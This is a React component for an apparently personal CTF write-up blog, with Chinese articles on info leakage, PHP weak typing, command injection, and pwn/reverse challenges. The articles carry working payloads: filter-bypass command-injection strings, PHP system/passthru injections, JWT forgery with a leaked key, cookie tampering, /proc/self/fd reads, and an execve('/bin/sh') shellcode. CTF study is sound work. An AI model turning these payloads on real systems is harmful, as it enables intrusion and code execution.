import { motion, AnimatePresence } from 'framer-motion'
import { useParams, Link } from 'react-router-dom'
import { ArrowLeft, Terminal, Copy, Check, X } from 'lucide-react'
import { useState, useEffect } from 'react'

// Easter egg trigger words
const triggerWords = ['flag', '一血', 'RCE', 'shellcode', 'JWT', 'IDOR', '越权', '伪造', 'bypass', '绕过']

function EasterEgg() {
  const [show, setShow] = useState(false)
  const [position, setPosition] = useState({ x: 0, y: 0 })

  useEffect(() => {
    const handleSelection = () => {
      const selection = window.getSelection()
      const text = selection.toString().toLowerCase()
      
      if (text && triggerWords.some(word => text.includes(word.toLowerCase()))) {
        const range = selection.getRangeAt(0)
        const rect = range.getBoundingClientRect()
        setPosition({
          x: rect.left + rect.width / 2,
          y: rect.top - 50
        })
        setShow(true)
        
        setTimeout(() => setShow(false), 3000)
      }
    }

    document.addEventListener('mouseup', handleSelection)
    return () => document.removeEventListener('mouseup', handleSelection)
  }, [])

  return (
    <AnimatePresence>
      {show && (
        <motion.div
          initial={{ opacity: 0, scale: 0.8, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.8, y: 10 }}
          className="fixed z-50 pointer-events-none"
          style={{ left: position.x, top: position.y, transform: 'translateX(-50%)' }}
        >
          <div className="bg-cyber-darker/95 border border-cyber-pink/50 rounded-lg px-4 py-2 shadow-lg shadow-cyber-pink/20">
            <div className="flex items-center gap-2">
              <span className="text-cyber-pink text-sm font-bold whitespace-nowrap">
                你知道的太多了
              </span>
              <button 
                onClick={() => setShow(false)}
                className="pointer-events-auto text-cyber-grid hover:text-cyber-pink transition-colors"
              >
                <X className="w-3 h-3" />
              </button>
            </div>
            <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 w-0 h-0 border-l-4 border-r-4 border-t-4 border-transparent border-t-cyber-pink/50" />
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}

const articles = {
  infoleak: {
    title: '信息收集与泄露',
    subtitle: 'Information Gathering & Leakage',
    content: `
做信息收集这类题，我最大的感受就是**别放过后台的每一条线索**。很多 flag 其实就藏在眼皮底下，只是我们没注意到。

## HTML 注释与前端泄露

最早的题目就有隐藏在 HTML 注释里的 base64 字符串。我习惯 Ctrl+U 看源码，结果在注释中发现一串可疑字符串，解码直接出 flag。

\`\`\`bash
echo 'ZmxhZ3sxM2Fh...' | base64 -d
# flag{13aab1b2-6ffc-40bb-b936-6bf02456afca}
\`\`\`

JSFuck 是另一个前端混淆的重灾区。页面上看起来是一堆乱码 \`[\`] \`(\`) \`!\` \`+\`, 其实是 JavaScript 表达式。最简单的方法是打开浏览器控制台，把变量名或密码值直接 \`eval()\`，不需要手动解码。

隐藏表单字段也是一个容易被忽略的点。有些题目把 \`is_admin\` 或 \`role\` 设为 \`type="hidden"\`，以为用户改不了。用 Burp Suite 拦截请求，把值从 0 改成 1：

\`\`\`bash
curl -X POST URL -d 'is_admin=1&nickname=test'
\`\`\`

## 响应头、302 响应体与协议层

用 \`curl -I\` 查响应头是基本功，但我在这道题上吃过亏——当时只看了 body，忽略了 \`X-Flag\` 字段，其实 flag 就藏在响应头里。

\`\`\`bash
curl -I URL   # X-Flag: flag{...}
\`\`\`

更隐蔽的是 302 重定向的响应体。很多人以为 302 只有 Location 头，没有 body，于是直接 \`allow_redirects=True\` 自动跟进，结果完全错过了藏在中间响应里的 flag。

\`\`\`python
r = requests.post(url, data={'solved':'1'}, allow_redirects=False)
# 错误：直接follow会错过body
# 正确：逐层检查每层响应的body
if 'flag{' in r.text: print(r.text)
\`\`\`

## 敏感文件与备份文件

这道题的入口藏在 \`robots.txt\` 里：\`Disallow: /qcq.php\`，访问即得 flag。

\`\`\`bash
curl URL/robots.txt     # Disallow: /qcq.php
curl URL/qcq.php        # 直接访问
\`\`\`

\`.phps\` 文件泄露源码也是经典——PHP 文件的备份版本会暴露完整逻辑：

\`\`\`bash
curl URL/index.phps     # 源码泄露，密码 QCyYdS
curl URL/?a=QCyYdS      # 提交密码
\`\`\`

常见的备份文件后缀我一般会批量扫：\`/index.phps\`、\`.bak\`、\`.swp\`、\`.git/config\`、\`/www.zip\`。

## Cookie 注入与认证绕过

Cookie 注入（IDOR）有时候比 SQL 注入还隐蔽。题目用 \`$_COOKIE['user']\` 判断权限，直接改 Cookie 比改 URL 参数更直接：

\`\`\`python
requests.get(url + '/wqw.php', cookies={'user': 'admin'})
# flag{ac4c342e-eee3-4c43-bce2-c4a4b42e8e2e}
\`\`\`

**关键**：必须用 Cookie 头而不是 URL 参数。

JWT 伪造则是另一个典型场景。如果源码里泄露了 HMAC 密钥，就能用 PyJWT 伪造任意身份：

\`\`\`python
import jwt
token = jwt.encode({"iss":"admin"}, "ctfshow_jwt_admin", algorithm="HS256")
\`\`\`

## /proc/self/ 文件系统利用

这道题很巧妙：代码限制了 \`$_GET['filename']\` 长度必须小于 17，但同时用 \`fopen\` 在 \`readfile\` 之前预先打开了一个文件描述符。

\`\`\`bash
curl "URL/?filename=/proc/self/fd/5"
# flag{97e38d30-ef25-47ad-b102-45f1b4659fac}
\`\`\`

**关键**：\`fopen\` 在 \`readfile\` 之前执行，fd 号可能是 3/4/5，需逐一尝试。

---

**踩坑教训**：做信息收集题目，**永远不要放过任何一条线索**。HTML 注释、响应头、robots.txt、备份文件、Cookie、JWT 密钥——每个角落都可能藏着 flag。
`
  },
  php: {
    title: 'PHP 弱类型',
    subtitle: 'PHP Weak Typing',
    content: `
PHP 的弱类型比较是 CTF 中最经典的知识点之一，也是这次刷题里踩坑最多的地方。核心原理很简单：PHP 在用 \`==\` 比较时会自动做类型转换，而 \`===\` 严格比较则不会。

## 弱比较绕过数字判断

最典型的场景是同时要求一个变量"为真"且"等于 0"。看起来矛盾，但 \`"0abc"\` 就能同时满足：

\`\`\`php
if($a and $a==0)    // "0abc" == 0 且为真
if(!is_numeric($b)) // "2027a" 含字母→false
if($b > 2026)       // "2027a" > 2026
\`\`\`

Payload: \`?a=0abc&b=2027a\`

## array_search 弱类型

\`array_search\` 默认用 \`==\` 比较，而 \`"QCCTF" == 0\` 为 true，所以它会错误地匹配到 index 0：

\`\`\`php
$key = array_search("QCCTF", $qc); // "QCCTF"==0 → key=0（错）
// 需要 key===1，所以 QCCTF 在 index 1
\`\`\`

Payload: \`?qc=["a","QCCTF"]\`

## 嵌套弱类型

更绕的还有嵌套弱类型：要求 \`0 == "QCyyds"\` 但 \`0 !== "QCyyds"\`：

\`\`\`php
// 0 == "QCyyds" 但 0 !== "QCyyds" ✓
\`\`\`

Payload: \`?qc={"0":"QCCTF","n":[0]}\`

## MD5 和 SHA1 绕过

0e 开头的哈希值在弱比较下会被当成科学计数法，等于 0：

\`\`\`
GET ?a=QNKCDZO&b=240610708
\`\`\`

但遇到 \`===\` 严格比较，0e 绕过就失效了。这时数组绕过登场：\`md5([])\` 和 \`sha1([])\` 对数组都返回 NULL，而 \`NULL === NULL\` 为 true：

\`\`\`
GET ?a[]=1&b[]=2
\`\`\`

---

## 速查表

| 场景 | Payload | 原理 |
|------|---------|------|
| \`== 0\` 绕过 | \`"0abc"\` | 字符串开头非数字则等于0 |
| is_numeric 绕过 | \`"2027a"\` | 含字母，不是纯数字 |
| 0e MD5 绕过 | \`QNKCDZO\` | 0e 开头的 hash 被当科学计数法 |
| md5/sha1 严格比较 | \`?a[]=1&b[]=2\` | 数组返回 NULL，NULL===NULL |
| array_search | \`["a","QCCTF"]\` | "QCCTF" 在 index 1 |

---

**踩坑教训**：
1. 永远先看清 \`==\` 还是 \`===\`，两种绕过思路完全不同
2. \`array_search\` 的弱类型陷阱容易被忽略，默认行为不是严格比较
3. 0e 绕过的字符串要验证 MD5 后确实是 0e 开头全数字
`
  },
  cmd: {
    title: '命令注入',
    subtitle: 'Command Injection',
    content: `
命令注入的考点从简单到变态，层层加码，每一道题都在考验对 Linux 命令行和 PHP 函数的理解深度。

## 基础注入与绕过

最基础的题目输入直接拼进 \`system()\`，没有任何过滤：

\`\`\`
POST cmd=cat /flag
\`\`\`

稍微加了点料——过滤了 flag 关键词——就用分号截断：

\`\`\`
POST cmd=ip;cat /flag
\`\`\`

过滤了空格怎么办？Linux 下 \`$IFS\` 是内部字段分隔符：

\`\`\`
POST cmd=cat\${IFS}/flag
\`\`\`

## 无字母 RCE ★（一血）

过滤了所有 a-zA-Z 字母，看起来完全没法构造命令。但 Linux 的 \`.\` 命令（等价于 \`source\`）可以读取并执行文件内容，而它本身不是字母：

\`\`\`
POST /?cmd=. /????.??? 2>&1
\`\`\`

\`/????.???\` 匹配 \`/flag.txt\`，\`.\` 执行文件内容，错误信息泄露 flag。

**关键细节**：\`system()\` 只捕获 stdout，而 source 执行不存在文件时错误信息走的是 stderr，必须加 \`2>&1\` 把 stderr 重定向到 stdout 才能看到 flag！

## PHP 函数调用链

如果题目把命令执行封装在 PHP 的 \`eval\` 或 \`system\` 里：

\`\`\`php
// ezcmd_6: eval执行
POST qc=system("cat /flag")

// ezcmd_7: 关键词过滤，字符串拼接
POST qc=system("cat /fl"."ag")

// ezcmd_8: passthru + 拼接
POST qc=passthru("cat /fl"."ag")

// ezcmd_9: tab绕过空格
POST qc=passthru("cat\\t/fl"."ag")
\`\`\`

## PHP 源码泄露

用 \`?>\` 提前结束 PHP 标签，后面的内容会被当成纯文本直接输出：

\`\`\`
GET /?qc=readfile('flag.php')?>
\`\`\`

URL 里记得编码为 \`%3F%3E\`。

---

## 绕过速查表

| 过滤项 | 绕过方法 |
|--------|---------|
| 空格 | \`\${IFS}\`, \`<\`, \`{cat,/flag}\`, tab |
| 关键词拼接 | \`"fl"."ag"\`, \`'fl'.'ag'\` |
| 无字母RCE | \`. /????.??? 2>&1\` (source泄露) |
| system/exec | passthru, shell_exec, proc_open |
| 输出重定向 | \`;\#\` 注释后面 |

---

**踩坑教训**：
1. \`2>&1\` 这个 stderr 重定向是真正的杀手锏，好几次我拿到了 payload 却看不到 flag，就是忘了加它
2. 无字母场景别死磕字母，\`.\`、\`$()\`、通配符都是非字母的可用资源
3. PHP 的 \`?>\` 闭合标签技巧很容易被忽略，它本质上是在利用 PHP 的混编机制
`
  },
  pwn: {
    title: 'PWN 与逆向',
    subtitle: 'PWN & Reverse Engineering',
    content: `
这次来聊聊 CTF 中两个最"硬核"的方向——PWN 和逆向。我挑了三道有意思的题目，难度从简单到困难都有覆盖。

## X0r — 逆向中的数据提取

给了一个 ELF binary，用 IDA 打开一看，核心逻辑就是两层 XOR。先把数据提取出来：

\`\`\`python
cipher = [0x61, 0x6e, 0x75, 0x60, 0x79, 0x6d, 0x37, 0x77,
          0x4b, 0x4c, 0x6c, 0x24, 0x50, 0x5d, 0x76, 0x33,
          0x71, 0x25, 0x44, 0x5d, 0x6c, 0x48, 0x70, 0x69]
key1 = [0x14, 0x11, 0x45]
key2 = [0x13, 0x13, 0x51]
flag = ''.join(chr((c ^ key1[i%3]) ^ key2[i%3]) for i, c in enumerate(cipher))
# flag{y0u_Kn0W_b4s1C_xOr}
\`\`\`

**踩坑**：从反汇编提取密文时，第 4 字节我抄成了 0x60，而实际应该是 0x79。结果解密出来第一位不是 \`g\` 而是 \`~\`。做逆向的时候，**数据提取一定要仔细**！

## Pwn's Door — 逆向密码算法

这道题更简单，binary 里 scanf 读取了一个整数，然后和 0x6b6579 做比较：

\`\`\`
0x6b6579 = 'k' + 'e' + 'y' → 十进制 7038329
\`\`\`

连接服务器的 9999 端口，输入这个数字：

\`\`\`
flag{6551ffb1-f3f2-42d2-bdc7-86ec5d2f2cca}
\`\`\`

## input_function — Shellcode 编写 ★（一血）

重头戏来了。这道题考的是真正的 PWN 核心：shellcode 编写。

程序逻辑极简：

\`\`\`c
void *mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...);
read(0, mem, 0x1000);
((void(*)())mem)();  // 直接执行用户输入！
\`\`\`

直接分配了一块 RWX 内存，然后把输入的内容当成代码执行——经典的 shellcode 执行场景。

我的目标是写一个 23 字节的 \`execve("/bin/sh")\` shellcode。系统调用号 59，参数布局：rax=59，rdi=字符串地址，rsi=0，rdx=0。

\`\`\`python
shellcode = bytes([
    0x48,0x31,0xf6,                         # xor rsi, rsi
    0x56,                                    # push rsi
    0x48,0xbf, 0x2f,0x62,0x69,0x6e,         # movabs rdi, "/bin//sh"
    0x2f,0x2f,0x73,0x68,
    0x57,                                    # push rdi
    0x54, 0x5f,                              # push rsp; pop rdi
    0x6a,0x3b, 0x58,                         # push 59; pop rax
    0x99,                                    # cdq (rdx=0)
    0x0f,0x05                                # syscall
])
\`\`\`

细节在于 "/bin//sh" 用了两个斜杠凑齐 8 字节对齐。压栈后用 \`push rsp; pop rdi\` 巧妙地把字符串地址取出来。

\`\`\`
flag{18744bff-3292-47b3-9f74-54a8e4b7f738}
\`\`\`

---

**总结**：这三道题代表了 CTF 中 PWN 和逆向的典型思路：数据提取与算法逆向、协议交互、以及底层 shellcode 编写。每道题都不算复杂，但拼在一起，正好覆盖了这个方向从入门到进阶的核心技能。
`
  }
}

export default function Article() {
  const { id } = useParams()
  const article = articles[id]
  const [copied, setCopied] = useState(false)
  
  if (!article) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-4xl font-bold text-cyber-cyan mb-4">404</h1>
          <p className="text-cyber-grid">文章不存在</p>
          <Link to="/" className="text-cyber-purple hover:text-cyber-cyan mt-4 inline-block">
            返回首页
          </Link>
        </div>
      </div>
    )
  }
  
  const copyCode = async (code) => {
    await navigator.clipboard.writeText(code)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }
  
  // Simple markdown-like rendering
  const renderContent = (content) => {
    const lines = content.trim().split('\n')
    const elements = []
    let inCodeBlock = false
    let codeContent = []
    let codeLang = ''
    
    lines.forEach((line, i) => {
      // Code block start
      if (line.startsWith('```')) {
        if (!inCodeBlock) {
          inCodeBlock = true
          codeLang = line.slice(3)
          codeContent = []
        } else {
          inCodeBlock = false
          elements.push(
            <div key={`code-${i}`} className="relative my-4">
              <div className="absolute top-2 right-2 flex items-center gap-2">
                <span className="text-xs text-cyber-grid font-mono">{codeLang}</span>
                <button
                  onClick={() => copyCode(codeContent.join('\n'))}
                  className="p-1 hover:bg-cyber-cyan/10 rounded transition-colors"
                >
                  {copied ? (
                    <Check className="w-4 h-4 text-cyber-cyan" />
                  ) : (
                    <Copy className="w-4 h-4 text-cyber-grid" />
                  )}
                </button>
              </div>
              <pre className="code-block">
                <code className="text-cyber-cyan/90">
                  {codeContent.map((c, j) => (
                    <div key={j}>{c || ' '}</div>
                  ))}
                </code>
              </pre>
            </div>
          )
        }
        return
      }
      
      if (inCodeBlock) {
        codeContent.push(line)
        return
      }
      
      // Headers
      if (line.startsWith('## ')) {
        elements.push(
          <h2 key={i} className="text-2xl font-bold text-cyber-cyan mt-8 mb-4 anime-title">
            {line.slice(3)}
          </h2>
        )
        return
      }
      
      // Horizontal rule
      if (line === '---') {
        elements.push(
          <hr key={i} className="my-8 border-t border-cyber-grid/30" />
        )
        return
      }
      
      // Table (simple detection)
      if (line.startsWith('|')) {
        // Skip table rendering for simplicity, just show as text
        elements.push(
          <div key={i} className="text-sm text-cyber-grid font-mono pl-4 border-l-2 border-cyber-grid/30 my-1">
            {line}
          </div>
        )
        return
      }
      
      // Bold text
      let processedLine = line.replace(/\*\*(.+?)\*\*/g, '<strong class="text-cyber-cyan font-bold">$1</strong>')
      
      // Inline code
      processedLine = processedLine.replace(/`(.+?)`/g, '<code class="px-1 py-0.5 bg-cyber-darker rounded text-cyber-pink font-mono text-sm">$1</code>')
      
      // Paragraph
      if (line.trim()) {
        elements.push(
          <p 
            key={i} 
            className="text-cyber-grid leading-relaxed my-3"
            dangerouslySetInnerHTML={{ __html: processedLine }}
          />
        )
      }
    })
    
    return elements
  }
  
  return (
    <>
      <EasterEgg />
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        className="min-h-screen py-20"
      >
      <div className="max-w-4xl mx-auto px-6">
        {/* Back button */}
        <Link to="/">
          <motion.button
            whileHover={{ x: -5 }}
            className="flex items-center gap-2 text-cyber-grid hover:text-cyber-cyan transition-colors mb-8"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="font-mono text-sm">返回首页</span>
          </motion.button>
        </Link>
        
        {/* Article header */}
        <motion.div
          initial={{ y: 20 }}
          animate={{ y: 0 }}
          className="mb-12"
        >
          <div className="flex items-center gap-2 mb-4">
            <Terminal className="w-5 h-5 text-cyber-purple" />
            <span className="text-cyber-purple/70 text-sm font-mono tracking-widest">
              ▶ WRITEUP
            </span>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-gradient anime-title mb-2">
            {article.title}
          </h1>
          <p className="text-cyber-grid text-lg font-mono">{article.subtitle}</p>
        </motion.div>
        
        {/* Article content */}
        <motion.div
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="cyber-card p-8"
        >
          <div className="prose prose-invert max-w-none">
            {renderContent(article.content)}
          </div>
        </motion.div>
      </div>
    </motion.div>
    </>
  )
}
